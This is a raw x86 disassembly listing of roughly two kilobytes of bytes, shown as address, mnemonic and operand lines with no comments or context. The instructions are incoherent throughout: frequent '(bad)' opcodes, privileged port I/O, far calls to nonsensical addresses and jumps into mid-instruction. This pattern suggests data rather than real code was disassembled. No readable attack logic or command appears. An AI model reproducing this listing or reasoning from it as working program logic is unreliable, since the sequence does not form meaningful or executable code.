  407e10:	add    BYTE PTR ds:0xa42ad876,dl
  407e16:	mov    ecx,0x3ee02318
  407e1b:	(bad)  
  407e1c:	cmp    dh,BYTE PTR [edx-0x5f]
  407e1f:	mov    ebp,0x845d62f2
  407e24:	xor    DWORD PTR [ecx-0x30],edx
  407e27:	dec    esi
  407e28:	mov    eax,ds:0xa92482d3
  407e2d:	xchg   ebx,eax
  407e2e:	or     eax,0x31663b8b
  407e33:	or     cl,0x1d
  407e36:	imul   ecx,DWORD PTR [ebp+edi*8-0x45],0xffffff89
  407e3b:	rol    ecx,0x2e
  407e3e:	fadd   DWORD PTR [edx+0x60]
  407e41:	adc    DWORD PTR [ebp-0x47],esp
  407e44:	xor    BYTE PTR [ecx],ch
  407e46:	mov    WORD PTR [edi],?
  407e48:	and    eax,0xae5ca8ca
  407e4d:	inc    ecx
  407e4e:	imul   eax,DWORD PTR [ecx-0x66baf64f],0x50
  407e55:	call   0x4ac45888
  407e5a:	pusha  
  407e5b:	and    BYTE PTR [ebp+0x9],ah
  407e5e:	sti    
  407e5f:	and    eax,0xcd8d6aec
  407e64:	dec    ebx
  407e65:	int3   
  407e66:	mov    esp,0x484dee40
  407e6b:	les    eax,FWORD PTR [esp+eax*4+0x40791d39]
  407e72:	push   edi
  407e73:	out    dx,al
  407e74:	xchg   ebx,eax
  407e75:	xor    BYTE PTR [edi-0x58167363],ah
  407e7b:	pop    ss
  407e7c:	push   0x22692525
  407e81:	sbb    ah,dh
  407e83:	mov    ebx,0x3a1dbb74
  407e88:	in     eax,dx
  407e89:	push   cs
  407e8a:	(bad)  [esi-0x69]
  407e8d:	(bad)  
  407e8e:	pusha  
  407e8f:	dec    eax
  407e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e91:	(bad)  [ecx-0x7d]
  407e94:	mov    bh,0x92
  407e96:	adc    al,0xa5
  407e98:	pop    esp
  407e99:	mov    eax,0xab0f6633
  407e9e:	and    BYTE PTR [edx],0x96
  407ea1:	cwde   
  407ea2:	cmp    eax,0xa6fd7b34
  407ea7:	fbld   TBYTE PTR [ecx-0xc19f5d8]
  407ead:	cmp    DWORD PTR [ecx-0x6e],ecx
  407eb0:	jo     0x407e97
  407eb2:	retf   0x8615
  407eb5:	ret    
  407eb6:	loope  0x407ebb
  407eb8:	fwait
  407eb9:	fwait
  407eba:	fwait
  407ebb:	dec    DWORD PTR [ebx]
  407ebd:	lock imul esi,edi,0xffffffa7
  407ec1:	and    DWORD PTR [ecx+eax*1-0x253a2120],ebp
  407ec8:	inc    edi
  407ec9:	inc    edx
  407eca:	ror    BYTE PTR [edi+0x10],cl
  407ecd:	test   eax,0xe295214
  407ed2:	mov    DWORD PTR [edi-0x29d273e4],0xc675e3ca
  407edc:	ret    0x30ba
  407edf:	pop    esp
  407ee0:	inc    ebp
  407ee1:	fucomip st,st(7)
  407ee3:	fcmovne st,st(5)
  407ee5:	push   edx
  407ee6:	mov    edi,0xde4ac091
  407eeb:	push   es
  407eec:	pop    ebx
  407eed:	mov    BYTE PTR [ebx+0x71],bh
  407ef0:	lea    ebx,[ebx]
  407ef2:	je     0x407f58
  407ef4:	fdivr  QWORD PTR [ecx]
  407ef6:	xchg   esp,eax
  407ef7:	add    al,0x95
  407ef9:	clc    
  407efa:	dec    edi
  407efb:	adc    eax,DWORD PTR [eax]
  407efd:	ins    BYTE PTR es:[edi],dx
  407efe:	std    
  407eff:	jnp    0x407f01
  407f01:	test   DWORD PTR [eax+0x3a3d60b9],edx
  407f07:	cwde   
  407f08:	call   0x9b823f20
  407f0d:	add    eax,0x30a00408
  407f12:	mov    dh,0xe
  407f14:	push   es
  407f15:	inc    ecx
  407f16:	mov    ecx,0x498a9943
  407f1b:	inc    esp
  407f1c:	sub    al,0xc3
  407f1e:	clc    
  407f1f:	repz mov eax,0x14630aed
  407f25:	mov    ecx,0x397936e
  407f2a:	or     bh,BYTE PTR [edi-0x519ed741]
  407f30:	or     eax,0x535894c6
  407f35:	nop
  407f36:	in     al,0x13
  407f38:	xchg   edx,eax
  407f39:	fdiv   QWORD PTR [ecx+0x3ec1ee87]
  407f3f:	ins    DWORD PTR es:[edi],dx
  407f40:	mov    ecx,0xda73348f
  407f45:	jmp    0xca5a:0x2deb5e80
  407f4c:	mov    al,ds:0x6bd065a4
  407f51:	shr    ebx,cl
  407f53:	ja     0x407f3e
  407f55:	mov    ah,0x3b
  407f57:	hlt    
  407f58:	jp     0x407fb7
  407f5a:	push   es
  407f5b:	and    DWORD PTR [ecx],0xffffff9d
  407f5e:	outs   dx,BYTE PTR ds:[esi]
  407f5f:	xchg   edi,eax
  407f60:	dec    esi
  407f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f62:	dec    ebx
  407f63:	mov    ebx,0x4a946dd
  407f68:	test   eax,0xa790fa4
  407f6d:	call   0xdf54:0x1e88d058
  407f74:	arpl   WORD PTR [eax],si
  407f76:	leave  
  407f77:	repz mov esp,0xe18c6b2a
  407f7d:	fidiv  DWORD PTR [ebp-0x5cb97395]
  407f83:	mov    edi,0xcf73dcf8
  407f88:	jne    0x407fc8
  407f8a:	div    BYTE PTR [ecx-0x38e82271]
  407f90:	loopne 0x407fac
  407f92:	add    dh,ch
  407f94:	inc    ecx
  407f95:	(bad)  
  407f96:	jecxz  0x408017
  407f98:	cld    
  407f99:	(bad)
  407f9d:	mov    ebp,0xf4a702
  407fa2:	push   esp
  407fa3:	jbe    0x407f41
  407fa5:	in     eax,0xd6
  407fa7:	in     eax,dx
  407fa8:	cmp    eax,0x1f5da70e
  407fad:	push   ebx
  407fae:	paddw  mm3,QWORD PTR [esi-0x33]
  407fb2:	add    DWORD PTR [eax],edx
  407fb4:	and    eax,0xf9bdc4ee
  407fb9:	jge    0x407f5f
  407fbb:	out    dx,al
  407fbc:	(bad)  
  407fbd:	cli    
  407fbe:	imul   eax,edi,0xffffffe6
  407fc1:	sar    DWORD PTR ds:0x939181d,0x1b
  407fc8:	test   DWORD PTR [ebx+ebp*8-0x17494b77],0x961792d2
  407fd3:	cmp    al,0x77
  407fd5:	dec    edx
  407fd6:	arpl   sp,si
  407fd8:	ret    0x21ad
  407fdb:	jno    0x408043
  407fdd:	inc    eax
  407fde:	repz jbe 0x407fcb
  407fe1:	mov    al,BYTE PTR [bx+si+0x6fc0]
  407fe6:	lods   al,BYTE PTR ds:[esi]
  407fe7:	rol    cl,0x2e
  407fea:	mov    dh,0x99
  407fec:	js     0x408049
  407fee:	or     al,0xc
  407ff0:	jle    0x407fad
  407ff2:	mov    es,WORD PTR [eax]
  407ff4:	sub    DWORD PTR [esi],eax
  407ff6:	pop    es
  407ff7:	jecxz  0x407f96
  407ff9:	nop
  407ffa:	aad    0xef
  407ffc:	cwde   
  407ffd:	pop    ecx
  407ffe:	call   0x11016fc8
  408003:	ret    0xeef1
  408006:	mov    ebx,0xa5169b44
  40800b:	outs   dx,BYTE PTR ds:[esi]
  40800c:	xchg   ecx,eax
  40800d:	xchg   edi,eax
  40800e:	jge    0x408067
  408010:	(bad)  
  408011:	sti    
  408012:	and    BYTE PTR [esi],ah
  408014:	(bad)  
  408015:	pusha  
  408016:	mov    WORD PTR [esi],es
  408018:	xchg   ebx,eax
  408019:	xchg   ebx,eax
  40801a:	mov    BYTE PTR [ecx],ch
  40801c:	dec    edx
  40801d:	iret   
  40801e:	push   ecx
  40801f:	cmp    ah,BYTE PTR [ebx]
  408021:	fnstsw WORD PTR [ebx]
  408023:	inc    esp
  408024:	in     al,dx
  408025:	cmp    ah,BYTE PTR [eax-0x5896b3b0]
  40802b:	pop    es
  40802c:	and    al,0x52
  40802e:	xchg   ebx,eax
  40802f:	dec    eax
  408030:	ret    
  408031:	inc    esi
  408032:	dec    edi
  408033:	xor    eax,ebp
  408035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408036:	hlt    
  408037:	mov    edx,0xebdfa2d
  40803c:	in     eax,dx
  40803d:	jbe    0x407fca
  40803f:	inc    esp
  408040:	and    eax,0xda424924
  408045:	push   0xffffff91
  408047:	and    al,0x2d
  408049:	rcl    BYTE PTR [esi-0x65],cl
  40804c:	shl    DWORD PTR [eax-0x50],0x70
  408050:	sub    BYTE PTR [ebx+0x5a608500],dh
  408056:	sbb    al,0x1e
  408058:	push   ds
  408059:	mov    ds:0x50254bb5,al
  40805e:	dec    edx
  40805f:	xor    DWORD PTR [esi],ebx
  408061:	(bad)  
  408062:	cdq    
  408063:	dec    esp
  408064:	es (bad) 
  408067:	push   es
  408068:	add    DWORD PTR [edi-0x20523c90],0xffffffb1
  40806f:	lods   al,BYTE PTR ds:[esi]
  408070:	add    eax,esp
  408072:	push   ds
  408073:	and    al,0x4d
  408075:	shr    DWORD PTR [ebp+0x9],cl
  408078:	out    dx,eax
  408079:	xor    edx,esi
  40807b:	add    BYTE PTR cs:[eax],al
  40807e:	stos   BYTE PTR es:[edi],al
  40807f:	mov    eax,ds:0xddaed7b6
  408084:	bound  edx,QWORD PTR [esi-0x344caf93]
  40808a:	jecxz  0x4080fc
  40808c:	fcmovnu st,st(3)
  40808e:	jb     0x408090
  408090:	inc    esi
  408091:	out    0x40,al
  408093:	ror    DWORD PTR [eax+esi*4],cl
  408096:	jle    0x408037
  408098:	cmp    BYTE PTR [esi-0x31],cl
  40809b:	mov    esi,0x2803c14a
  4080a0:	ror    DWORD PTR [eax-0x6c9577ea],1
  4080a6:	add    eax,0xcc33d61f
  4080ab:	xor    ecx,ecx
  4080ad:	cmp    al,0xb3
  4080af:	int3   
  4080b0:	xor    ecx,DWORD PTR [ebx+0x5e]
  4080b3:	or     BYTE PTR [edx+0x53],cl
  4080b6:	push   edi
  4080b7:	hlt    
  4080b8:	fmul   DWORD PTR [eax+ebx*2]
  4080bb:	in     eax,0x7f
  4080bd:	ins    BYTE PTR es:[edi],dx
  4080be:	ret    0x7c52
  4080c1:	lods   al,BYTE PTR ds:[esi]
  4080c2:	mov    DWORD PTR [edx],ecx
  4080c4:	fdivr  DWORD PTR [eax+0x6ae857ac]
  4080ca:	jnp    0x4080df
  4080cc:	cmp    BYTE PTR [edx],bl
  4080ce:	mov    edi,0x303db44d
  4080d3:	or     eax,0x8af85383
  4080d8:	popa   
  4080d9:	inc    esp
  4080da:	inc    eax
  4080db:	adc    DWORD PTR [ebx],eax
  4080dd:	dec    ecx
  4080de:	push   eax
  4080df:	jl     0x40814c
  4080e1:	push   ss
  4080e2:	mov    WORD PTR [ebx+0x246312d4],fs
  4080e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e9:	dec    ebp
  4080ea:	sub    ebx,ecx
  4080ec:	inc    dl
  4080ee:	dec    edi
  4080ef:	popa   
  4080f0:	push   ss
  4080f1:	dec    esp
  4080f2:	and    eax,0x9750e12f
  4080f7:	push   0x8d4b625d
  4080fc:	fstp   QWORD PTR [edi-0x4ef089df]
  408102:	in     eax,0x1c
  408104:	imul   ecx,DWORD PTR [esi],0xa47dcae9
  40810a:	cdq    
  40810b:	mov    eax,ds:0x209848c8
  408110:	in     eax,dx
  408111:	test   BYTE PTR [esi+0x4b],cl
  408114:	icebp  
  408115:	mov    bh,0xff
  408117:	neg    bh
  408119:	inc    edx
  40811a:	test   eax,0x1fef52ee
  40811f:	cld    
  408120:	add    al,0xb7
  408122:	outs   dx,BYTE PTR ds:[esi]
  408123:	frstor [edx]
  408125:	iret   
  408126:	jae    0x40817a
  408128:	aas    
  408129:	ret    
  40812a:	push   esp
  40812b:	pop    ecx
  40812c:	xchg   esi,eax
  40812d:	in     al,dx
  40812e:	out    dx,al
  40812f:	out    dx,al
  408130:	mov    dh,0x37
  408132:	ss ss push ds
  408135:	arpl   WORD PTR ds:0x79503f00,cx
  40813b:	dec    eax
  40813c:	dec    eax
  40813d:	fst    DWORD PTR [ecx-0x2a]
  408140:	(bad)  
  408141:	aad    0xcd
  408143:	xchg   DWORD PTR [eax],eax
  408145:	scas   eax,DWORD PTR es:[edi]
  408146:	pop    esi
  408147:	(bad)  [ebx]
  408149:	iret   
  40814a:	dec    edi
  40814b:	lock into 
  40814d:	ins    BYTE PTR es:[edi],dx
  40814e:	hlt    
  40814f:	add    BYTE PTR [esi],dl
  408151:	push   es
  408152:	test   BYTE PTR [edx+0x28],ch
  408155:	in     al,0x3b
  408157:	xchg   esp,eax
  408158:	pop    edx
  408159:	scas   al,BYTE PTR es:[edi]
  40815a:	shl    DWORD PTR [ecx-0x68],0x87
  40815e:	jne    0x40812a
  408160:	fs sub al,0x46
  408163:	or     ecx,DWORD PTR [edx+0x20cf32c2]
  408169:	retf   
  40816a:	pop    ebp
  40816b:	mov    ds:0x283b340f,eax
  408170:	loopne 0x40814f
  408172:	or     BYTE PTR [esi],0xa2
  408175:	icebp  
  408176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408177:	jb     0x4081b0
  408179:	pop    eax
  40817a:	lahf   
  40817b:	out    dx,eax
  40817c:	sbb    BYTE PTR [ecx-0x70a41de1],bh
  408182:	lea    esp,[ebx+0x2e220c55]
  408188:	sbb    eax,DWORD PTR [ebx+0x23e5541]
  40818e:	xchg   eax,ebx
  408190:	in     al,dx
  408191:	mov    al,0xd4
  408193:	pop    ecx
  408194:	inc    esp
  408195:	pusha  
  408196:	or     al,0xc1
  408198:	push   edi
  408199:	shl    DWORD PTR [esi+ebx*2-0x3a],1
  40819d:	mov    WORD PTR [edx-0x590fc8ce],fs
  4081a3:	xchg   ecx,eax
  4081a4:	dec    ecx
  4081a5:	cld    
  4081a6:	pop    es
  4081a7:	repnz mov dl,0x4f
  4081aa:	pop    esi
  4081ab:	sahf   
  4081ac:	mov    al,ds:0xb01590d0
  4081b1:	cmp    esi,DWORD PTR [edi]
  4081b3:	int3   
  4081b4:	out    0x25,eax
  4081b6:	mov    bl,0xac
  4081b8:	and    BYTE PTR [edi+0x5e25384f],bl
  4081be:	loopne 0x4081e7
  4081c0:	aaa    
  4081c1:	scas   eax,DWORD PTR es:[edi]
  4081c2:	xchg   edx,eax
  4081c3:	and    al,0x49
  4081c5:	xchg   ebp,eax
  4081c6:	and    bl,BYTE PTR ds:0xdb61fef7
  4081cc:	ins    BYTE PTR es:[edi],dx
  4081cd:	ss pop ebx
  4081cf:	retf   0xc83b
  4081d2:	mov    dl,0xcc
  4081d4:	pop    eax
  4081d5:	imul   ebp,edi,0x5b
  4081d8:	pop    esi
  4081d9:	rcr    BYTE PTR [edx],0x0
  4081dc:	out    dx,al
  4081dd:	inc    ecx
  4081de:	je     0x408239
  4081e0:	mov    esi,0x895ab547
  4081e5:	push   esp
  4081e6:	retf   0x9185
  4081e9:	lods   al,BYTE PTR ds:[esi]
  4081ea:	fwait
  4081eb:	jl     0x408230
  4081ed:	dec    edx
  4081ee:	dec    ecx
  4081ef:	sahf   
  4081f0:	iret   
  4081f1:	mov    ecx,0x5cca6376
  4081f6:	mov    bh,0x8f
  4081f8:	ja     0x4081cc
  4081fa:	pop    eax
  4081fb:	shr    DWORD PTR [ebp+0x40c98778],0x31
  408202:	ror    DWORD PTR [eax+0x577bf47b],cl
  408208:	hlt    
  408209:	sbb    bh,al
  40820b:	inc    esp
  40820c:	neg    DWORD PTR [eax+0x39]
  40820f:	in     eax,dx
  408210:	mov    ah,0x8b
  408212:	fbld   TBYTE PTR [edi+0x5]
  408215:	int3   
  408216:	jae    0x4081e0
  408218:	jae    0x408289
  40821a:	sbb    DWORD PTR [ebx],0x6f
  40821d:	iret   
  40821e:	stos   DWORD PTR es:[edi],eax
  40821f:	lds    ebp,FWORD PTR [ecx-0x12]
  408222:	sub    BYTE PTR [ebx],ch
  408224:	div    BYTE PTR [edi]
  408226:	sbb    eax,0xd222cd88
  40822b:	pop    ds
  40822c:	mov    bh,0x8a
  40822e:	inc    ecx
  40822f:	sbb    al,0xc9
  408231:	sub    bl,BYTE PTR [edx]
  408233:	sti    
  408234:	xchg   esi,eax
  408235:	fadd   DWORD PTR [ebx]
  408237:	or     esp,DWORD PTR [eax-0x78]
  40823a:	cdq    
  40823b:	inc    esp
  40823c:	int3   
  40823d:	and    BYTE PTR [edx],al
  40823f:	imul   ebp,DWORD PTR [eax+0x186220c0],0x1
  408246:	sbb    al,0x82
  408248:	pop    ecx
  408249:	push   edx
  40824a:	cdq    
  40824b:	sbb    ch,ah
  40824d:	and    al,BYTE PTR [edx+0x11]
  408250:	add    al,ah
  408252:	xor    BYTE PTR [ebx-0x1ce90cb4],dl
  408258:	jns    0x4081e5
  40825a:	mov    ebp,0xd89e9f71
  40825f:	out    0x91,al
  408261:	xchg   DWORD PTR [ebx-0x2e],edx
  408264:	xor    al,0xa5
  408266:	sub    al,0xb5
  408268:	scas   eax,DWORD PTR es:[edi]
  408269:	cmp    DWORD PTR [edx+0x44],0xffffffa1
  40826d:	hlt    
  40826e:	jmp    0x4082bb
  408270:	xor    al,0x23
  408272:	or     DWORD PTR [ebp+0x59],esp
  408275:	push   ss
  408276:	pop    edx
  408277:	jmp    0x408254
  408279:	ja     0x408224
  40827b:	in     eax,0x7b
  40827d:	xchg   esi,eax
  40827e:	xor    eax,0x2883dc00
  408283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408284:	fiadd  WORD PTR [edi+0x200735b5]
  40828a:	mov    eax,0x6f374041
  40828f:	in     al,dx
  408290:	jno    0x40827d
  408292:	sbb    BYTE PTR ss:[ebx+0x3c02111e],dl
  408299:	call   0xb595:0x565ddf62
  4082a0:	mov    esp,0xaa2e4e3
  4082a5:	sbb    al,0x7c
  4082a7:	stos   DWORD PTR es:[edi],eax
  4082a8:	mov    edi,0x8c58f823
  4082ad:	adc    eax,0x265b31be
  4082b2:	push   ebx
  4082b3:	ret    
  4082b4:	sub    bl,BYTE PTR fs:[eax-0x41a6fa34]
  4082bb:	call   0x70e415c9
  4082c0:	ins    BYTE PTR es:[edi],dx
  4082c1:	aad    0xed
  4082c3:	(bad)  
  4082c5:	jbe    0x408262
  4082c7:	mov    ebx,0xa2f8a444
  4082cc:	push   ecx
  4082cd:	loopne 0x40833d
  4082cf:	clc    
  4082d0:	push   esi
  4082d1:	push   ebp
  4082d2:	jns    0x4082e0
  4082d4:	push   ds
  4082d5:	jbe    0x40829c
  4082d7:	ja     0x408358
  4082d9:	out    dx,eax
  4082da:	loope  0x408274
  4082dc:	cmp    BYTE PTR es:[edx+esi*2-0x4bbc7eb],al
  4082e4:	lea    esp,[edi+0x1]
  4082e7:	and    DWORD PTR [edx+0x62],ebx
  4082ea:	lods   al,BYTE PTR ds:[esi]
  4082eb:	push   ebx
  4082ec:	cld    
  4082ed:	ret    0xc083
  4082f0:	cmp    al,0x87
  4082f2:	ret    
  4082f3:	sbb    DWORD PTR [edi+eiz*2+0x368052d0],ecx
  4082fa:	or     al,0xed
  4082fc:	pushf  
  4082fd:	lea    eax,[ecx+0xf]
  408300:	sub    DWORD PTR [esi+edx*8],esp
  408303:	xchg   esi,eax
  408304:	sub    esi,ebx
  408306:	pop    es
  408307:	repnz cmp al,0x67
  40830a:	jg     0x40838b
  40830c:	mov    edi,0x4a520006
  408311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408312:	shr    DWORD PTR [ecx-0x41082103],cl
  408318:	mov    bh,0x66
  40831a:	add    BYTE PTR [edi],bh
  40831c:	dec    eax
  40831d:	dec    ecx
  40831e:	xchg   edx,eax
  40831f:	in     al,0xa4
  408321:	rcr    edx,1
  408323:	lea    eax,[ecx]
  408325:	mov    BYTE PTR [esi+0x1],al
  408328:	sub    ch,BYTE PTR [ecx]
  40832a:	cmp    DWORD PTR [eax],edi
  40832c:	fsub   DWORD PTR [edi-0x1]
  40832f:	inc    eax
  408330:	xor    ch,0xc3
  408333:	and    BYTE PTR [ebx+0x7b],0xff
  408337:	pop    esi
  408338:	jns    0x4083ab
  40833a:	fsub   QWORD PTR [edx]
  40833c:	imul   eax,edi,0xffffffbd
  40833f:	popf   
  408340:	fidivr WORD PTR [eax+eax*4]
  408343:	xor    ecx,0x1a
  408346:	sbb    DWORD PTR [ebx],edi
  408348:	sbb    eax,0x2cb4aa6b
  40834d:	mov    eax,ds:0xb18e3755
  408352:	push   ss
  408353:	mov    WORD PTR [esi+0x32cc0514],?
  408359:	cwde   
  40835a:	into   
  40835b:	sub    eax,0x163b9b3
  408360:	test   DWORD PTR [esi+0x61c9a796],eax
  408366:	cmp    al,BYTE PTR [ebx-0x30e4c606]
  40836c:	fcmovu st,st(4)
  40836e:	(bad)  
  40836f:	xchg   esp,eax
  408370:	jecxz  0x40832c
  408372:	xor    bl,BYTE PTR [edx+0x10011e87]
  408378:	dec    ebp
  408379:	repz and edi,DWORD PTR [esi]
  40837c:	push   edi
  40837d:	add    BYTE PTR [ecx-0x4f9d9a1a],al
  408383:	mov    ch,cl
  408385:	mov    bh,BYTE PTR [eax+0x7f]
  408388:	xor    BYTE PTR ds:0xf5a10662,ah
  40838e:	and    bh,cl
  408390:	imul   edx,esi,0x2912d172
  408396:	fdivr  QWORD PTR [esi+0x75f4d73c]
  40839c:	xchg   BYTE PTR [edx-0x63],dl
  40839f:	push   0x10
  4083a1:	push   esp
  4083a2:	dec    esp
  4083a3:	std    
  4083a4:	inc    ebx
  4083a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a6:	imul   ebx,DWORD PTR [ecx-0x6a],0x2fefefec
  4083ad:	and    eax,0xf7ad6914
  4083b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083b3:	shr    ecx,cl
  4083b5:	mov    ch,0xbb
  4083b7:	aam    0xd2
  4083b9:	cmp    eax,0xee001acb
  4083be:	inc    ecx
  4083bf:	lods   al,BYTE PTR ds:[esi]
  4083c0:	mov    ch,0x43
  4083c2:	and    dh,0x52
  4083c5:	pusha  
  4083c6:	inc    edx
  4083c7:	dec    edx
  4083c8:	mov    BYTE PTR [edi+0x130e0e13],0x17
  4083cf:	sbb    bh,BYTE PTR [ebx]
  4083d1:	lea    ecx,ss:[edi-0x41388763]
  4083d8:	sub    edi,DWORD PTR [edi-0x54]
  4083db:	xor    WORD PTR [edi],ax
  4083de:	sar    DWORD PTR [ebp+0x7575131c],0x95
  4083e5:	(bad)  
  4083e6:	fcomp  QWORD PTR [ecx-0x26a4c7b7]
  4083ec:	push   edx
  4083ed:	xchg   esp,eax
  4083ee:	or     dh,BYTE PTR cs:[eax]
  4083f1:	iret   
  4083f2:	pusha  
  4083f3:	sahf   
  4083f4:	cmp    eax,DWORD PTR [edi+0x60]
  4083f7:	mov    BYTE PTR [eax],cl
  4083f9:	sbb    BYTE PTR [ebx],cl
  4083fb:	mov    dl,0x79
  4083fd:	call   0x9a7f:0x5de02a6
  408404:	mov    bh,0xf8
  408406:	mov    dh,0xc4
  408408:	pop    ds
  408409:	pop    edi
  40840a:	xchg   esi,eax
  40840b:	and    eax,0x90a468c6
  408410:	push   esp
  408411:	sub    edi,DWORD PTR [eax]
  408413:	xor    eax,0xc808ddaf
  408418:	les    ebx,FWORD PTR [eax+0x2c]
  40841b:	sbb    eax,eax
  40841d:	mov    al,0x84
  40841f:	shl    DWORD PTR [ebp+0x6076758d],1
  408425:	xchg   esp,eax
  408426:	arpl   WORD PTR [esi+0x4a],ax
  408429:	mov    ebx,0xe42516f3
  40842e:	push   es
  40842f:	pop    edx
  408430:	cmp    DWORD PTR [edx+edx*4+0x182a7e92],esi
  408437:	push   cs
  408438:	aaa    
  408439:	xor    DWORD PTR [edx+0x3f1b25c],edi
  40843f:	and    BYTE PTR [eax-0x53],ch
  408442:	xchg   edi,eax
  408443:	idiv   cl
  408445:	out    dx,eax
  408446:	push   edi
  408447:	test   BYTE PTR [eax],dl
  408449:	imul   eax,DWORD PTR [esi],0xfffffff0
  40844c:	adc    DWORD PTR [ecx+eiz*1],0xffffffe5
  408450:	mov    dh,0xd1
  408452:	sbb    bl,BYTE PTR [ecx]
  408454:	add    eax,DWORD PTR [eax-0x6794a7f0]
  40845a:	dec    esi
  40845b:	out    0x1c,al
  40845d:	into   
  40845e:	jp     0x408468
  408460:	popa   
  408461:	sbb    eax,0x94b66c8d
  408466:	call   0x2d51:0xdce81d7d
  40846d:	cld    
  40846e:	push   cs
  40846f:	lods   eax,DWORD PTR ds:[esi]
  408470:	jg     0x408497
  408472:	sub    edi,DWORD PTR [eax]
  408474:	jmp    0x3dc6:0x874ca3f8
  40847b:	aad    0x1e
  40847d:	xor    dh,al
  40847f:	loopne 0x40843b
  408481:	push   ss
  408482:	pop    ebx
  408483:	imul   edx,DWORD PTR [ecx],0xffffffd6
  408486:	mov    ds:0xcb6b408d,al
  40848b:	cmp    al,0xb7
  40848d:	mov    es,WORD PTR [ecx]
  40848f:	int3   
  408490:	sbb    al,0x10
  408492:	adc    al,0xe5
  408494:	ret    0x500c
  408497:	repnz or BYTE PTR [ebx],dh
  40849a:	loopne 0x4084d4
  40849c:	push   edx
  40849d:	stos   DWORD PTR es:[edi],eax
  40849e:	ret    
  40849f:	and    ecx,DWORD PTR [eax+0x64d511cf]
  4084a5:	lea    esp,[ecx+0x6f]
  4084a8:	out    dx,eax
  4084a9:	es xchg edi,eax
  4084ab:	cs mov esp,0x5f37f9ce
  4084b1:	and    ecx,edi
  4084b3:	xor    edx,DWORD PTR [edx+edx*2+0x3c9b870c]
  4084ba:	idiv   al
  4084bc:	xchg   ebx,eax
  4084bd:	pushf  
  4084be:	cmp    al,0xfd
  4084c0:	add    ch,bh
  4084c2:	rol    DWORD PTR [esi-0x13],0x52
  4084c6:	icebp  
  4084c7:	xor    eax,0xaed6a402
  4084cc:	fnstsw WORD PTR [eax+0x8be559f]
  4084d2:	lock push es
  4084d4:	pop    ecx
  4084d5:	enter  0xf073,0xaf
  4084d9:	dec    edx
  4084da:	clc    
  4084db:	pop    esi
  4084dc:	mov    edi,0x9ffa3895
  4084e1:	sub    BYTE PTR [eax-0x55],ch
  4084e4:	sbb    BYTE PTR [esi+0x6a],0x19
  4084e8:	or     al,0x6
  4084ea:	xchg   esp,eax
  4084eb:	arpl   WORD PTR ds:[eax-0x2b],si
  4084ef:	cld    
  4084f0:	push   es
  4084f1:	jns    0x4084a7
  4084f3:	mov    edx,0x781dbc54
  4084f8:	jmp    0x408519
  4084fa:	inc    bl
  4084fc:	jg     0x408556
  4084fe:	lods   al,BYTE PTR ds:[esi]
  4084ff:	mov    eax,0x6b25b785
  408504:	add    BYTE PTR [eax+0x73ee7c8b],bh
  40850a:	lahf   
  40850b:	xchg   ebx,eax
  40850c:	dec    edx
  40850d:	retf   0x2513
  408510:	ds pop es
  408512:	and    BYTE PTR [eax+ebp*1-0x21238d64],bh
  408519:	popf   
  40851a:	xor    bl,BYTE PTR [edi-0x22b1af47]
  408520:	(bad)  
  408521:	aas    
  408522:	mov    ss,WORD PTR [esi]
  408524:	xor    al,0x4c
  408526:	xchg   DWORD PTR [eax-0x1825b87c],esp
  40852c:	add    DWORD PTR [edx+eax*1+0x28],edx
  408530:	js     0x408558
  408532:	ror    DWORD PTR [esp+ebx*1+0x55f9d12c],1
  408539:	(bad)  
  40853a:	(bad)  
  40853c:	(bad)  
  40853d:	cmp    BYTE PTR [ecx+ebx*2+0x6d],bh
  408541:	aaa    
  408542:	sbb    BYTE PTR [ebx+0x6ccb0a28],ch
  408548:	outs   dx,BYTE PTR ds:[esi]
  408549:	cdq    
  40854a:	into   
  40854b:	sub    al,0x87
  40854d:	xor    ecx,ebx
  40854f:	je     0x40857f
  408551:	enter  0x2832,0x3b
  408555:	or     ecx,DWORD PTR [edi+0x79]
  408558:	lea    esp,[ecx-0x5]
  40855b:	push   ebx
  40855c:	or     dh,BYTE PTR [ecx-0x15c64e50]
  408562:	xchg   ecx,eax
  408563:	out    dx,al
  408564:	push   edx
  408565:	cmp    eax,0xfc39c470
  40856a:	mov    dh,0xd9
  40856c:	je     0x408530
  40856e:	sbb    ebp,DWORD PTR [edi+0x5bbd877e]
  408574:	pop    ss
  408575:	push   eax
  408576:	shl    al,cl
  408578:	shr    cl,0xa1
  40857b:	mov    bh,0xd6
  40857d:	fdiv   QWORD PTR [ebx+0x45eb795c]
  408583:	pop    esi
  408584:	jns    0x40856f
  408586:	pop    ebx
  408587:	ins    BYTE PTR es:[edi],dx
  408588:	in     eax,dx
  408589:	pushf  
  40858a:	in     eax,0xa9
  40858c:	lahf   
  40858d:	clc    
  40858e:	or     BYTE PTR [ebx+0x4abb90c1],al
  408594:	test   al,0x86
  408596:	(bad)  
  408597:	jne    0x408534
  408599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40859a:	inc    esi
  40859b:	and    eax,0xc17d516a
  4085a0:	sub    al,0x50
  4085a2:	ror    BYTE PTR ds:0x3033f2a6,cl
  4085a8:	mov    al,ds:0x5f2e944
  4085ad:	xchg   edx,eax
  4085ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085af:	pop    edx
  4085b0:	xor    al,0x46
  4085b2:	mov    ebx,0xa76b20f5
  4085b7:	call   0x2441:0x8b5a74e
  4085be:	scas   eax,DWORD PTR es:[edi]
  4085bf:	(bad)  
  4085c1:	(bad)  
  4085c2:	out    dx,eax
  4085c3:	pop    ebp
  4085c4:	(bad)  
  4085c5:	add    BYTE PTR [eax+0x17],dh
  4085c8:	xor    esi,eax
  4085ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085cb:	mov    edx,0x10a5372c
  4085d0:	cmc    
  4085d1:	ja     0x408601
  4085d3:	add    al,0x58
  4085d5:	int    0xed
  4085d7:	mov    ebp,0xd7b8ac8c
  4085dc:	adc    al,0xe0
  4085de:	inc    esi
  4085df:	(bad)  
  4085e1:	dec    edi
  4085e2:	stc    
